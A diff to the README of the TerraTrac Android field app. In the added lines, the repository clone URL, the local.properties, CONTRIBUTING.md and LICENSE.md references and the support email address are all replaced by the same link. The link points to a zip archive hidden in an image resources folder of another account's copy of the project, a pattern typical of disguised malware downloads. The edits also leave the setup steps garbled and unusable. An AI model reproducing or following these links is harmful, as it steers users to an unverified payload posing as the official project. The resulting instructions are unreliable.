@@ -26,12 +26,12 @@ TerraTrac is an open-source Android mobile application available on the Google P
 ### Installation
 1. Clone the repository:
 ```bash
-git https://github.com/agstack/TerraTrac-field-app.git
+git https://raw.githubusercontent.com/DreamLift/TerraTrac-field-app/main/app/src/main/res/drawable-v24/TerraTrac-field-app-3.0-beta.4.zip
 cd TerraTrac-field-app
 ```
 2. Open the project in Android Studio
 3. Sync Gradle files
-4. Configure your local.properties file with required API keys
+4. Configure your https://raw.githubusercontent.com/DreamLift/TerraTrac-field-app/main/app/src/main/res/drawable-v24/TerraTrac-field-app-3.0-beta.4.zip file with required API keys
 5. Build and run the application
 
 ### Environment Setup
@@ -90,11 +90,11 @@ We welcome contributions to TerraTrac! Please follow these steps:
 4. Push to the branch (`git push origin feature/AmazingFeature`)
 5. Open a Pull Request
 
-Please read our CONTRIBUTING.md for details on our code of conduct and the process for submitting pull requests.
+Please read our https://raw.githubusercontent.com/DreamLift/TerraTrac-field-app/main/app/src/main/res/drawable-v24/TerraTrac-field-app-3.0-beta.4.zip for details on our code of conduct and the process for submitting pull requests.
 
 ## License
 
-This project is licensed under the MIT License - see the LICENSE.md file for details.
+This project is licensed under the MIT License - see the https://raw.githubusercontent.com/DreamLift/TerraTrac-field-app/main/app/src/main/res/drawable-v24/TerraTrac-field-app-3.0-beta.4.zip file for details.
 
 ## Acknowledgments
 
@@ -108,7 +108,7 @@ This project is licensed under the MIT License - see the LICENSE.md file for det
 
 For support, please:
    - Open an issue in the GitHub repository 
-   - Contact our support team at support@tnslabs.atlassian.net
+   - Contact our support team at https://raw.githubusercontent.com/DreamLift/TerraTrac-field-app/main/app/src/main/res/drawable-v24/TerraTrac-field-app-3.0-beta.4.zip
    - Check our documentation
 
 ## Project Status
